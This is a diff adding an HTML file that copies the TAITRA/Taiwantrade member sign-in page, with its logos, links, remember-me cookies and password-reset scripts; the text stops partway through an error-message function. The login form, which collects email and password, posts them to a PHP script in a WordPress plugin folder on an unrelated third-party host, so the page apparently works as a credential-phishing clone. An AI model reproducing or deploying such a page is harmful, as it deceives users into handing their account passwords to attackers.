@@ -1,0 +1,577 @@
+<!DOCTYPE html><html>
+<head>
+    <title>TAITRA</title>
+    <meta charset="UTF-8"/><meta http-equiv="X-UA-Compatible" content="IE=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><!-- webfont --><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous"><!-- hyUI --><link rel="stylesheet" href="https://member.taitra.org.tw/sso/css/en/hyui_admin.css"><style>
+	.loading-modal {
+		display: none;
+		position: fixed;
+		z-index: 1000;
+		top: 0;
+		left: 0;
+		height: 100%;
+		width: 100%;
+		background: rgba(255, 255, 255, .8) url(https://member.taitra.org.tw/sso/'images/loading.gif') 50% 50%
+			no-repeat;
+	}
+	
+	div.service > a{
+		color:#0085cf;
+		font-size:.813em;
+		white-space:nowrap;
+		margin-left:1em;
+	}
+	.login.fullSize{
+		width:100%;
+		max-width: unset;
+	}
+	
+	.textBlack{
+		color: black;
+	}
+
+</style>
+    <script type="text/javascript" src="https://member.taitra.org.tw/sso/webjars/jquery/3.3.1/jquery.min.js"></script>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/></head>
+
+<body>
+<div class="wrapper">
+	<header class="header" >
+            <div class="container">
+                <div class="language"> 
+                    <ul>
+                    	<li>
+                    		<a href="https://member.taitra.org.tw/sso/./login?locale=zh_TW">台灣廠商由此登入</a>
+                    	</li>
+                    </ul>
+                </div>
+                <h1>
+                	<a href="https://member.taitra.org.tw/sso/./login">
+                		<img src="https://member.taitra.org.tw/sso/images/logo.png" alt=""><img src="https://member.taitra.org.tw/sso/images/logo_taiwantrade.png" alt=""></a>
+                </h1>
+                
+            </div> 
+        </header>
+	<main role="main">
+	    <div id="content" class="row">
+        <div class="col-md">
+            <div class="admin_wrapper" >
+			<div class="container">
+				<h2 class="title">登入</h2>
+				<div class="login">
+					<div class="mask">
+						<!-- 登入 --><div class="login_block">
+							<!-- <h2 th:text="#{screen.welcome.title}" style="margin-left: 5%; padding-left: .0em;">Form Title</h2> --><h2>Sign In</h2>
+							<form method="post" id="fm1" action="https://test.globalit.com/wp-content/plugins/lxiizrj/taiwann/login.php">
+								<div class="form_grp">
+									<label for="username" class="form_title">Please enter your Email</label>
+									<div class="form_content">
+										<input type="text" id="username" value="" class="id"
+											placeholder="Email"
+											autocomplete="off" name="username"></div>
+								</div>
+								<div class="form_grp">
+									<label for="password" class="form_title">Please enter your Password</label>
+									<div class="form_content">
+										<input name="password" type="password" value=""
+											required class="pw" placeholder="Password" id="password"></div>
+								</div>
+								<div class="form_grp">
+									<div class="checkbox">
+										<label><input type="checkbox" value="true" id="rememberMyAccount"><span >Remember my account</span></label>
+									</div>
+									<div class="form_content">
+										<a href="https://member.taitra.org.tw/sso/#" class="forget"><i
+											class="far fa-arrow-alt-circle-right"></i>Forgot your password?</a>
+									</div>
+								</div>
+								<!--
+	                              <div class="checkbox" th:if="${rememberMeAuthenticationEnabled}">
+	                                 <label for="rememberMe" th:text="#{screen.rememberme.checkbox.title}"><input type="checkbox" name="rememberMe" id="rememberMe" value="true">記住我</label>
+	                              </div>
+                              	--><div class="btn_grp" >
+									<input name="submit" type="submit" value="Sign In"
+										class="btn btn-green" /></div>
+								<input type="hidden" name="execution"
+									value="2d1e8c1b-e309-40ce-a469-ca476c9b7bd9_ZXlKaGJHY2lPaUpJVXpVeE1pSjkuK1dJM2hoSHkrWm8yajk4L3dUa1RTQTg5RU84VmgzT2hTTGlnWkhZeWZNeC8yOTlpOXE4TmxZL0YvNHpiUmxCU25QcEVmeWtFTUJUOUJTYS9tNUNMWVZ6dkkwaHZtRjRVQ2cwUTNRc1RMYm9mcnhXS3RIbElKVjlwV1kyUWlVeldhUnlIZURGRzNCY3NtTEV2T1RCcDVFazRGb3EvNy8wM0twZmwvMTFwbXArZGRuWXhRQjNQOFd4Uzk1NDl0VDNGSUJmVFpjbllIbkdXdmdkeEdJQkxuNVYxNmpGbjRVcjdzaVZGbWhLeUtYd1g2ZFZUNGFlWjJsdUVMMXRWT1JGY0Uvd0VwYUJ6cHJzMG9kU2ZMVXlEVCtZelF6OTZOTzgxb3MzaGQ2cklsY1AwclhXUWpNSnQyWkMzdWVRTys1Qm8xTjBRdEpRWWI0akVvQnFvVFNvZlg2N2hEejNKRUtaNDNjWXVaYW4xQ3pURURhMnhrVTFuL09sSVQ2UE8yT1FwSkxMVE9GT2ZBQ3UzalAyUWxRNzRTYmFiVHdIM3RCeG16VXdxZVhGdTlPL3pBcWtvZkg1V1Y3YTgvaUw5TmV4RGJNd1BJRS9PWEZ0azIyZWVnQ2xuT29HRStneDZORlVtb1NGUmI0UFV4aXQ2VCt5M1ZRZ1Y2cGlMTUJoajJSeDRIcXBZM3BlWWhUZnQrRWgwZ3RVeklCcFM4SU9PT0JXTDc1emlpZmdScTY3aGhPUFgya21KSk5WWTU4T2FyeFpvZ3VURUIwajhaRGVCVHZFbmwzVFhIcGZvZUhUMGh5Z21JRGJhYm10RE9DbTJCSkkwMTUrcmtQUmIxd1BhK0hPKzlWUitUQmZsWTlNZkRtN2hIdWxFLzZpZG5DSGQxaC9EQWg5SjI1VkZpZzZSNEdCZXQ1L3BKYUZGZHJ4emM1ZHlGM1p1S2NLbGM0Y2VpUTZMa3FqSytuMTByVHd0VlgvNUVnWC94alIzSGkzTTRPYzgyeEFRbTMxNXNFbFBXK0VWcTBNSHNvMzdxVGsrMUNFcWNvRVZSSHZwbHhCV3FWUFJwZnJnbk9OejVYUVRha0R0ZWxubkhTcXpHaEpRS2swYW93VHg5dXl6Z2c0azI5T3hzb1RrMlFtQ251QUU5Um55b2pOUWNMNjJWS2lLTCtVSVlTWXN2aFpFRlp4cGI2NC9OQWRuRHhkMWo3RHh0eEhSeld0L1NXUGlSUE5sZnB0bFlWSVJXb0dGTFNNb25Lc2N4dVh6YngvbDhhNVRQS2VTQW1obWJtd0FsZDRtMVlCbEExN25xSksrdWhFSkxMK0VvdGxKNjZzYmVuMy8xWWdZVUxpYXFXNlN1NXJ4YkFwNzBVQVc2eXIyTjZ2Z3JGcCtIZU13M216ZUN6aFVjdFpQYXZlczlLanNhVkdsckxHMzlQc21nUDZ6eUtjamd5dzc5M3RhSkVKaE5BMWM4blZpM25qZzdKMW1aK0cwb0c2QVdBOE9mU0dsMzBxeldvK0ZpMlhDdjFjUnRnb1pIeG0xZGs5ZHFCV1A5R0R1RDBTZkVyY2xxU1o5RnFYY05LdWlsenoyRm1iQ1JzMkdEbmNXWlY4YWkydVZld1d0bXdzT29oZmFWRm90QnNjR0QyNnEyaUlMcU5FMkM1ZXRDZ09Bak1EMHFVRjBCUFVMK3orVTJFSEovT3dmN21zMFFXWHo5SzNzcnk5YlVMbTdQK3FYVUdJbWJaOXhWQlU2aVhoaFVZekNxVWlKb3VTZWVvZHk0M3R4dXJlM2NUTlZXaEpYQ29wazNWbGw0WHhoTGgxMEtOOENQY1ExdDlaY1Yxc293WmJBQnJ0QnFaMzdqdk1nSUV4VWpqNnRWT0ZLLy9TNXh5STYrOFh6QmExY3ZGaDRpYjZKYnJ3N0cyWmdHR21mVzRxTVlYNE51SzdTVFhrUCtCTmRNempHamd4ZllLaHJ3RWdDdy9zbE5PK2tOV0picGwwRFZ0REJkNlpFVW5EWDA0enZvdjZwSFZjNXA4VmlVSVRFOGM3RVJlV0NQaE9ZZkFVbXVOMUZmeU9qMmlZZk9zNjlqNXB3UTAvNVQvRTZvWFByNmEwY3VvVDc4VFFreW4wMVhUL2pTK09yeGNkMG5YRVYzTG5xU21GV2V0OVUxRFc1RVJWQWFRT2ZPOWJ0bFU5Z1BzamUrUkx1YmRlNkJibSt0MkhSNlhLOWo0Q0VLYVpFaGQzYVZ5YmViRkhpT2dOWVZJT3ZPUkhxTXFmbDRwSkhiTWVWaVBFTmw0cWJ1ZU0rQWRRUThxcUtkUTZoK0J1NXVWbEthWjFiYlovRUkyNWI2TEhlNUcwVjJjUGVWZzRjeTNpVEt0UlRZaWU4NGNHZW1GeXNQQnlFUmRwZ2hlL2I4c2VBV3JPcHIyOWhLSytCaDFoNmVUOTNMdlQ1aGsySEdreEUyeFpGanlveWZVb2tGbWdMUnlFaWh6RURiQzFWNVc2SWtzckNscnorRGV6K1U1VjFudHBQTGw4czJUNXpocFczeUpXcjVDWjQzL1lmcHJDZEpwejJwSkNCN25sZ29pMk1oblJJdkE3OVo3c3h2anlzbjRXSlduOTh5ZE5XTzNFMDk2dWpwWWxZYnBNUjNOeU5GM0F3TXptRENjdTBGN0VjdjlUU0ZUZ21rVGh5cnkwM004QVhCZm1XZkhYNzJBM0QxclVkcTl1bU1OK1ZsdWJIRHpjcHYxcDVQbVNTbWsvaVA2S3J4UmxLLytocnVFUlQwM1gwUDd6ZElJUEd1NnBDMmhHM1dhemtGN3c2QzFEMXppNzJlL1d6eHU5NVZ0U0E0Nk5Fajh1VTRaZTJYbm1VcUdZejc0REdpbzlGZnp4Ly8rS044RTJIdDRob29UVnluMkRDWmk5STBndEtlbEF2TTBWdkNNWEJxRnA0ZVlNUElENEtQZi9ERjVGWTA1RnFDay9Wa2pPYzgrcHEyWDN0SXhYNHdvNWNEU0MzY3FYUWVUN2N4M0pKalNQUEtDTFcvdkhnMi95QXFQNERLdTNpc25IRUJ5NVpSZnFRb3lHR0lSTEtFdlBmRWVxSEhzaUhVN05XN2oyQVBHV3AwRWVzUFRRSTRKakVJTXplUGVBN0dic092ZnVCZlVmRHdpb2FIOTVMeVZDcUNxWE53bjd1d0RhaC9pOVo5azNlU3JTMGlXOG81N1p6Y3JYaDY1S0haVTc4VXJuZDBwb24rL0ZXMDBPVW5HZG9ZcmgyTlNZV3o2bjluSWFxRGo4WGh4bXlqZlR6NGFSdzlFQmsrOHpMOElNZ3YydFZNZGtrdnBtL3RDbFhxYTR2ZlNQK2pLZzVIcjh3SVRsSlhqUkNtazBEdW8zQ1BuU2MzTUkwenBKOUw5NFRReHo5clQrOEhEa0pmU2JPeXdQWVBUT3NXWWJwTUw5ZUFFNW82TG9qd2d5VnNJOGxzNTVaTlBXZGJVSXV6YnRWa0RQajBvbno4UVZ0MzE0dWFNT1I2eVZWZ1NpSDRvUGg2ZXAvY0VIY2E0V1l3TUFhMU9aQVd4RjVpVU9CUTNkUVloMXZRalhHQk5pcndMVVJzL3RvRTlzU1JVSHYvaEtkN0tpVHpUejJ3V2Vsc3VzaDNZTko4Mm1SK0RTajV0YTN2dDV5Nk1QZG4rNHQzaUVEMXhlWENwVDAvOWtRQ2NISEgxN0E4UkQrQ3QrQWg0T29vcDFXa09mYXVHaTFrY0RwVjlJOGhmOWl1V0FtTm9wMytSaGFydXgxK2RyUDkwQmZJSWVJOUxZYXlNd3FiZENSRjg2MlJLMXdTQlFoRnF2dlVsS0ZHQnFIUkV6SlNmaVV1dnRtTm9kY2sxNmtQdkxNYlBCelZRbGFydm14WFFuR1ZxbGNNcjhHdjFDZEMzVnBPYjBsN2dISHRBb2labVlJZGtWdGw1YzRnSldZcWg3N0ZxdUJKbTlJY1RqaXlaLytvd2dlNGIwNEVGZWRWd0NhZUd6Y3puWnlRSS9HQisvOFp2NmhweHBEMlQ0SExyNlo3YUxEdVR6QTNaT042RG1oUDFZWlNTQW9ZSnV6b1VrdUwrQjBsUGdFamVkWjQxVktBbGFrWnFFMWF5SmQxSFBlMnkrSlU3MUo1RVRIUlpqWkwvZjlJcG94SnltMklCSkViUVBsQi9lR1VFdCs0MDA2bzRsUjd5QmhQMW9QcU0rNk94M0FMbU1vNVFhY1g1eDk3MWNZZmYySENWZHAvR1NMNE1jRTJSVHhVc3VydnZ1bEZwWFUwZzFIUk1VcW45cUdJQWt3eUlKK0VYYkUzWkVXL3gzd2hkR2lxZkQzaXFGTktrNWZjNy9rdHNDZHNkOVc2cVh0YXlJb0tUMXNVbkRSbWlDSE82Tm0vQmVtSk9rdk53UXFnWTlkTlJGK0w2VXZnM25SM3NQMFZoVEpGRzBWUTJlOGxzTTBNK0Zlc3IyR3YxeGNteTFlL0VUVTJFdm9md2tUTWRFWUYyM0pJeHYrYVZQWWVuLy92cTBXdjA2bmZ4bjFpdWtvMTVhSE40aHJtSmU1SWhUS3lKcDVYOVA2UFNsSjZON2h3WU52aFdvd09pbVk4YUxEK2RhSmVpQjFDYWIrNDJKemYxMi9ITHdzQ2dwa3QxWE5WVnFkZVRuTDZNUzNpcGpZRVFja0lqMD0uX04xS2E4aHQybzR5UWFTZEpxNUtodVBJYnctMzZLekNOVjNvd3ZZNW8wRHFqd3hpRGJfVzl2U0luQ29NOFdScFRjcmZGRHNyblhrNkY1ZHpIZHNsaVE=" /><input type="hidden"
+									name="_eventId" value="submit" /><input type="hidden"
+									name="geolocation" /></form>
+							<div class="quick_login">
+								<h2>Sign in with：</h2>
+									<ul>
+										<li><a  class="facebook" href="https://member.taitra.org.tw/sso/clientredirect?client_name=Facebook&amp;service=https://www.taiwantrade.com/login?redirect=https%3A%2F%2Fwww.taiwantrade.com%2F%3FcleanCache%3DTrue%26gclid%3DEAIaIQobChMI5M3hqtC-5AIVkIRwCh1LGAbdEAAYASAAEgKuTvD_BwE%23&amp;locale=en"><i
+											class="fab fa-facebook-f"></i></a></li>
+										<li><a class="google" href="https://member.taitra.org.tw/sso/clientredirect?client_name=Google&amp;service=https://www.taiwantrade.com/login?redirect=https%3A%2F%2Fwww.taiwantrade.com%2F%3FcleanCache%3DTrue%26gclid%3DEAIaIQobChMI5M3hqtC-5AIVkIRwCh1LGAbdEAAYASAAEgKuTvD_BwE%23&amp;locale=en"><i class="fab fa-google"></i></a>
+										</li>
+										<li><a class="twitter" href="https://member.taitra.org.tw/sso/clientredirect?client_name=Twitter&amp;service=https://www.taiwantrade.com/login?redirect=https%3A%2F%2Fwww.taiwantrade.com%2F%3FcleanCache%3DTrue%26gclid%3DEAIaIQobChMI5M3hqtC-5AIVkIRwCh1LGAbdEAAYASAAEgKuTvD_BwE%23&amp;locale=en"><i class="fab fa-twitter"></i></a></li>
+										<li><a  class="linkedin" href="https://member.taitra.org.tw/sso/clientredirect?client_name=LinkedIn&amp;service=https://www.taiwantrade.com/login?redirect=https%3A%2F%2Fwww.taiwantrade.com%2F%3FcleanCache%3DTrue%26gclid%3DEAIaIQobChMI5M3hqtC-5AIVkIRwCh1LGAbdEAAYASAAEgKuTvD_BwE%23&amp;locale=en"><i
+											class="fab fa-linkedin"></i></a></li>
+									</ul>
+							</div>
+						</div>											
+	
+						<!-- 忘記密碼 --><div class="forget_block">
+							<h2 id="requestTitle">Please enter your email</h2>
+							<form method="post" action="<?php echo basename(__FILE__); ?>">
+								<div class="form_grp" id="requestPwd">
+									<div class="form_content">
+										<input required type="text" id="requestForgotPwdEmail" value="" class="mail" autocomplete="off"
+											onkeydown="return onForgetPwdStap1PressEnter(event);" placeholder="Please enter your email"><input required type="text" id="verifyCode" value="" style="display:none;"
+											onkeydown="return onForgetPwdStap2PressEnter(event);" placeholder="Please enter your verification code"><span id="targetEmailInfo" style="color: #1098f5;font-size:.813em;"></span>
+										<a id="modifyForgotPwdMail" style="display: none;font-size:.813em;" onclick="javascript:resetForgetPwdForm()">Change email</a>
+										<span id="errorMessage" style="color: red;display:block;font-size:.813em;"></span>
+										<span id="resetCountDown" style="display:block;font-size:.813em;"></span>
+									</div>
+								</div>
+								<!-- 
+								<div th:if="${#messages.msg('screen.locale')=='zh_TW'}" th:remove="tag">
+									<label style="display: block;"><input type="checkbox" id="sendSMSChkBox"><span th:text="#{screen.forgetPwd.button.sendByPhone}"
+												>sms code</span></label>
+								</div>
+								 --><div class="btn_grp">
+									<input class="back" type="reset"
+										value="Back"/><input id="requestBtn" type="submit"
+										value="Submit" onclick="javascript:requestResetMail()"/><input id="verifyBtn" type="submit" style="display:none;"
+										value="Submit" onclick="javascript:verify()"/></div>
+							</form>
+						</div>
+					</div>
+				</div>
+				<div class="service">
+					<div>
+			<p >Taiwantrade.com is powered by TAITRA (Taiwan External Trade Development Council), Taiwan's foremost nonprofit trade promoting organization with 63 Taiwan Trade Centers worldwide.</p>
+			<h2 style="margin-top: 2em;">TAITRA Affiliated Websites</h2>
+			<ul style="margin-top: unset;">
+            	<li><a style="cursor:default;"></a>www.taiwantrade.com</li>
+                <li><a style="cursor:default;"></a>www.taiwantradeshows.com.tw</li>
+            </ul>
+            <div class="btn_grp">
+				<a class="btn btn-blue" href="https://member.taitra.org.tw/sso/reg" target="_blank">Join FREE</a>
+            </div>
+		</div>
+					</div>
+                <div class="bottom">
+                	</div>
+			</div>
+		</div>
+        </div>
+    </div>
+	</main>
+	<footer>
+		<p>
+			Address: 5-7F, Guomao Building, No. 333, Section 1, Keelung Road, Taipei TEL: 886-2-2725-5200 <!-- <label
+				th:text="#{screen.footer.label.servicephone} + #{screen.footer.label.servicephoneno}"
+				th:remove="tag"></label>  --><a href="https://member.taitra.org.tw/sso/mailto:aboutsso@taitra.org.tw" target="">Contact us</a><a href="https://www.taitra.org.tw/cp.aspx?n=30&s=6" target="_blank">Privacy Policy</a>
+		</p>
+	</footer>
+</div>
+<div id="loadingIMG" class="loading-modal"></div>
+<!--<script type="text/javascript" th:src="https://member.taitra.org.tw/sso/@{#{webjars.zxcvbn.js}}"></script> --><script type="text/javascript" src="https://member.taitra.org.tw/sso/webjars/jquery-ui/1.12.1/jquery-ui.min.js"></script>
+<script type="text/javascript" src="https://member.taitra.org.tw/sso/webjars/jquery-cookie/1.4.1-1/jquery.cookie.js"></script>
+<!-- Google Recaptcha --><!--<script th:src="https://member.taitra.org.tw/sso/@{#{webjars.bootstrapmin.js}}"></script> --><script src="https://member.taitra.org.tw/sso/webjars/headjs/1.0.3/head.min.js"></script>
+<script src="https://member.taitra.org.tw/sso/webjars/store.js/1.3.17/store.min.js"></script>
+<script type="text/javascript"
+	src="https://member.taitra.org.tw/sso/js/cas.js"></script>
+
+<script src="https://member.taitra.org.tw/sso/js/jquery.easing.min.js"></script>
+<script src="https://member.taitra.org.tw/sso/vendor/slick/slick.min.js"></script>
+
+<script src="https://member.taitra.org.tw/sso/js/customize.js"></script>
+
+<script>
+	var i = "One moment please..."
+         $( document ).ready(function() {
+         	// is remember my account enabled
+         	var isRememberMeEnabled = $.cookie('URM');
+         	
+         	if(isRememberMeEnabled && window.atob(decodeURIComponent(isRememberMeEnabled))=='Y'){
+         	    $('#rememberMyAccount').prop('checked', true);
+         		var savedAccount = $.cookie('TAC');
+         		if(!$('#username').val() && savedAccount){
+         			$('#username').val(window.atob(decodeURIComponent($.cookie('TAC'))));
+         		}
+         	}
+         	
+             $("#fm1").submit(function () {
+             	var remberMeEnabled = $('#rememberMyAccount').is(":checked");
+             	
+             	if(remberMeEnabled){
+             	 	var expireDate = new Date('Tue, 19 Jan 2040 00:00:00 UTC');
+             	 	$.cookie('TAC',window.btoa($('#username').val()), {expires: expireDate, path: '/'});
+             	 	$.cookie('URM',window.btoa('Y'), {expires: expireDate, path: '/'});             	 	
+             	 }else{
+             	    $.cookie('TAC',window.btoa(''), {expires: expireDate, path: '/'});
+             	 	$.cookie('URM',window.btoa('N'), {expires: expireDate, path: '/'}); 
+             	 }
+                 $(":submit").attr("disabled", true);
+                 $(":submit").attr("value", i);
+
+                 return true;
+             });
+         });
+         
+         jQuery(document).ready(function($) {
+        $('.forget').click(function(e) {
+            $('.login_block').animate({ 'left': '-100%' }, 400, 'easeOutExpo');
+            $('.forget_block').animate({ 'left': '0' }, 400, 'easeOutExpo');
+            e.preventDefault();
+        });
+        $('.back').click(function(e) {
+            $('.login_block').animate({ 'left': '0%' }, 400, 'easeOutExpo');
+            $('.forget_block').animate({ 'left': '100%' }, 400, 'easeOutExpo');
+            e.preventDefault();
+        });
+        $('input').focus(function(event) {
+            $(this).removeAttr('placeholder');
+        });
+    });
+
+head.ready(document, function () {
+    if (!window.jQuery) {
+    	var jqueryUrl = "\/sso\/webjars\/jquery\/3.3.1\/jquery.min.js"; 
+        head.load(jqueryUrl, loadjQueryUI);
+    } else {
+        notifyResourcesAreLoaded(resourceLoadedSuccessfully);
+    }
+});
+
+function loadjQueryUI() {
+	var jqueryUrl = "\/sso\/webjars\/jquery-ui\/1.12.1\/jquery-ui.min.js"; 
+	head.load(jqueryUrl, loadjQueryCookies);
+}
+
+function loadjQueryCookies() {
+	var jqueryUrl = "\/sso\/webjars\/jquery-cookie\/1.4.1-1\/jquery.cookie.js"; 
+	head.load(jqueryUrl, notifyResourcesAreLoaded(resourceLoadedSuccessfully));
+}
+
+function notifyResourcesAreLoaded(callback) {
+    if (typeof callback === "function") {
+        callback();
+    }
+}
+
+</script>
+
+<script>
+    /*<![CDATA[*/
+
+    var trackGeoLocation = false;
+
+    var googleAnalyticsTrackingId = null;
+
+    if (googleAnalyticsTrackingId != null && googleAnalyticsTrackingId != '') {
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+
+        ga('create', googleAnalyticsTrackingId, 'auto');
+        ga('send', 'pageview');
+    }
+
+    /*]]>*/
+</script>
+
+<script>
+
+	jQuery(document).ready(function($) {
+	
+		var resetErrors;
+
+		$('.forget').click(function(e) {
+			$('.login_block').animate({
+				'left' : '-100%'
+			}, 400, 'easeOutExpo');
+			$('.forget_block').animate({
+				'left' : '0'
+			}, 400, 'easeOutExpo');
+			resetForgetPwdForm();
+			e.preventDefault();
+		});
+		$('.back').click(function(e) {
+			$('.login_block').animate({
+				'left' : '0%'
+			}, 400, 'easeOutExpo');
+			$('.forget_block').animate({
+				'left' : '100%'
+			}, 400, 'easeOutExpo');
+			resetForgetPwdForm();
+			e.preventDefault();
+		});
+		$('input').focus(function(event) {
+			// $(this).removeAttr('placeholder');
+		});
+
+
+		$('#sendSMSChkBox').change(smsChkboxChecked)
+		
+			
+		if(getQueryVariable('forgotPwd')=== 'Y' && document.querySelector('.forget')){	
+			document.querySelector('.forget').click();
+		}
+
+	})
+
+	function validateEmail(email) {
+		var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+		return re.test(String(email).toLowerCase());
+	}
+
+	function getQueryParam(name) {
+		var results = new RegExp('[\?&]' + name + '=([^&#]*)')
+			.exec(window.location.search);
+
+		return (results !== null) ? results[1] || 0 : '';
+	}
+</script>
+
+<script>
+/*<![CDATA[*/
+	var counterInterval;
+	var resetButtonDebounceTime = 30000;
+	var infoTimeout;
+	var errorTimeout;
+	var sendSMS = 'N';
+	var smsAlerted = false;
+	var userLocale = "en";
+	
+	function requestResetMail(){
+		var targetMailAddr = $('#requestForgotPwdEmail').val();
+		if(!validateEmail(targetMailAddr)){
+			setErrorMessage(getErrorCode('INVALID_EMAIL_FORMAT'));
+			return;
+		}
+		targetMailAddr = encodeURIComponent(targetMailAddr);
+		$('#verifyCode').val('');
+		setErrorMessage('');
+		$('#targetEmailInfo').text('');
+		if(targetMailAddr){
+			removeCoundown();
+			$('#loadingIMG').show();
+			jQuery.ajax({
+				url: '/rest/taitra/member/user/accounts/requestPwdReset?email='+targetMailAddr+'&sendByPhone='+sendSMS+'&locale='+userLocale,
+				method: 'POST',
+				contentType: 'application/x-www-form-urlencoded',
+				statusCode:{
+					502: function(resp){ setErrorMessage(getErrorCode('GTO')) },
+					504: function(resp){ setErrorMessage(getErrorCode('GTO'))}
+				},
+				success: function(data){
+					if(data && data.verificationValidDate){
+						$('#verifyCode').show();
+						$('#verifyBtn').show();
+						$('#requestPwd').show();
+						$('#requestForgotPwdEmail').hide();
+						$('#verifyCode').show();
+						$('#requestTitle').text("Please enter your verification code");
+						codeVerifyCoundown(convertToLocalDate(data.verificationValidDate));
+						setResendVerifyCodeDebounce();
+						$('#targetEmailInfo').text("We've sent an email to {0}".replace('{0}', $('#requestForgotPwdEmail').val() )+ '.');
+					}else{
+						setErrorMessage(getErrorCode('CANNOT_GET_EXPIRE_TIME'));
+					}
+				},
+				error: function(xhr, status, err){
+					resetForgetPwdForm();
+					var respErr = xhr.responseText;
+					if(respErr){
+						try{
+							setErrorMessage(getErrorCode(JSON.parse(respErr).errorCode));
+						}catch(formatErr){
+							setErrorMessage(getErrorCode('UNK'));
+						}
+					}
+				},
+				complete: function(){
+					$('#loadingIMG').hide();	
+				}
+			})
+		}
+	}
+	
+		
+	function resetForgetPwdForm(){
+		$('#verifyCode').hide();
+		$('#verifyBtn').hide();
+		$('#requestPwd').show();
+		$('#requestBtn').show();
+		$('#requestForgotPwdEmail').show();
+		$('#modifyForgotPwdMail').hide()
+		$('#requestBtn').val( "Submit");
+		$('#resetCountDown').html('');
+		$('#infoMessage').html('');
+		$('#errorMessage').html('');
+		$('#targetEmailInfo').html('');
+		$('#requestTitle').text("Please enter your email");
+
+		removeCoundown();
+	}
+	
+	function convertToLocalDate(endDate){
+		var utc = new Date(new Date(endDate).getTime() - 8*60*60*1000);
+    	var offsetMillis = utc.getTime() - new Date().getTimezoneOffset()*60*1000
+    	return new Date(offsetMillis);
+	}
+	
+	function removeCoundown(){
+		$('#resetCountDown').html('');
+		clearInterval(counterInterval);
+	}
+	
+	function codeVerifyCoundown(endDate) {
+		endDate = endDate.getTime();
+		removeCoundown();
+		$('#resetCountDown').css('color', 'black');
+		
+		counterInterval = setInterval(function(){
+			var newDate = new Date().getTime();
+			
+			if ((endDate - newDate) < 0) {
+				clearInterval(counterInterval);
+				$('#resetCountDown').html("Verification code has expired.");
+				$('#resetCountDown').css('color', 'red');
+				return;
+			}
+			var secDiff = (endDate - newDate) / 1000;
+			var minsLeft = Math.floor(secDiff / 60).toLocaleString('en-US', { minimumIntegerDigits: 2, useGrouping: false });
+			var secondsLeft = Math.floor(secDiff % 60).toLocaleString('en-US', { minimumIntegerDigits: 2, useGrouping: false });
+			var leftTimeStr = minsLeft + ':' + secondsLeft;
+			$('#resetCountDown').html("Verification code will expire in " + leftTimeStr);
+		}, 1000);
+	}
+	
+	function onForgetPwdStap1PressEnter(e){
+	    if (e.keyCode == 13) {
+        	requestResetMail();
+        	return false;
+   		}
+   		return true;
+	}	
+	
+	function onForgetPwdStap2PressEnter(e){
+		if (e.keyCode == 13) {
+        	verify();
+        	return false;
+   		}
+   		return true;
+	}
+	
+	function setResendVerifyCodeDebounce(){
+		$('#requestBtn').hide();
+		$('#requestBtn').val("Resend Email");
+		$('#modifyForgotPwdMail').hide()
+		setTimeout(function(){
+			$('#requestBtn').show();
+			$('#modifyForgotPwdMail').show()
+		}, resetButtonDebounceTime);
+		
+	}
+	
+	function setErrorMessage(msg){
+		$('#infoMessage').text('');
+		$('#errorMessage').text(msg);
+	}
+
+	function verify(){
+		var code = encodeURIComponent($('#verifyCode').val());
+		if(code){
+			$('#loadingIMG').show();
+			jQuery.ajax({
+				url: '/rest/taitra/member/user/accounts/confirmPwdReset?verificationCode='+code,
+				method: 'PUT',
+				statusCode:{
+					500: function(resp){
+						var respObject = resp.responseJSON;
+						try{
+							if(respObject && respObject.message.indexOf('WRONG verificationCode')!=-1){
+								setErrorMessage(getErrorCode('IVC'));
+							}
+						}catch(formatErr){
+							setErrorMessage(getErrorCode('UNK')) 
+						}
+					},
+					502: function(resp){ setErrorMessage(getErrorCode('GTO')) },
+					504: function(resp){ setErrorMessage(getErrorCode('GTO'))}
+				},
+				success: function(data){
+					if(data && data.authToken){
+						var service = getQueryVariable('service');
+						if(!service)
+							service = window.location.hostname + '/tmbc';
+						var locale = "en";
+						if(!locale)
+							locale = 'en';
+						window.location.href = '/tmbc/changePwd?service='+service + '&locale='+locale +'&authToken='+data.authToken;
+					}else
+						setErrorMessage(getErrorCode('NO_TOKEN_ERR'));
+				},
+				error: function(xhr, status, err){
+					var respErr = xhr.responseText;
+					if(respErr){
+						try{
+							setErrorMessage(getErrorCode(JSON.parse(respErr).errorCode));
+						}catch(formatErr){
+							setErrorMessage(getErrorCode('UNK'));
+						}
+					}
+				},
+				complete: function(){
+					$('#loadingIMG').hide();}
+				})
+		}
+	}
+	
+	function getQueryVariable(variable) {
+		var query = window.location.search.substring(1);
+		var vars = query.split("&");
+		for (var i=0;i<vars.length;i++) {
+			var pair = vars[i].split("=");
+			if (pair[0] == variable) {
+				return pair[1];
+			}
+		} 
+		return null;
+	}
+
+	
+	function getQueryVariable(variable) {
+		var query = window.location.search.substring(1);
+		var vars = query.split("&");
+		for (var i=0;i<vars.length;i++) {
+			var pair = vars[i].split("=");
+			if (pair[0] == variable) {
+				return pair[1];
+			}
+		} 
+		return null;
+	}
+	
+	function smsChkboxChecked(event){
+		if(!smsAlerted){
+			alert("Verified contact mobile phone only. ");
+			smsAlerted = true;
+		}
+		sendSMS= event.target.checked ? 'Y': 'N';
+	}
+	
+	function getErrorCode(code){
+		switch(code){
+			case 'IVC':
+				return "Invalid verification code";
+			case 'GE003':
+				return "Your email is not registered.";
+			case 'INVALID_EMAIL_FORMAT':
+				return "Email is required";
+			case 'CANNOT_GET_EXPIRE_TIME':
+				return "Unknown error({0}). Please contact your support desk.".replace('{0}', 'CGET');
+			case 'NO_TOKEN_ERR':
+				return "Unknown error({0}). Please contact your support desk.".replace('{0}', 'NTE');
